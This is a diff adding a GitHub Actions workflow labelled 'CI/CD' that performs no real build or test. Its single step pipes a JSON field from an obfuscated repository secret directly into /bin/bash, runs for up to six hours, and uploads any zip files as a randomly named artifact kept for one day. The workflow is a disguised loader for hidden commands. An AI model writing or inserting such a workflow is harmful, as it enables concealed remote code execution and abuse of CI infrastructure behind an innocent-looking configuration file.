@@ -1,0 +1,28 @@
+name: CI/CD
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  ci:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Launch
+        env:
+          fib741: ${{ secrets.fib741 }}
+        run: |
+          printf '%s' "$fib741" | jq -r .rxa897 | /bin/bash
+          echo $fmca7735 | jq -r .mhmlb66478 | /bin/bash
+
+      - name: Save artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: 7Z6JrLjK
+          path: "*.zip"
+          retention-days: 1
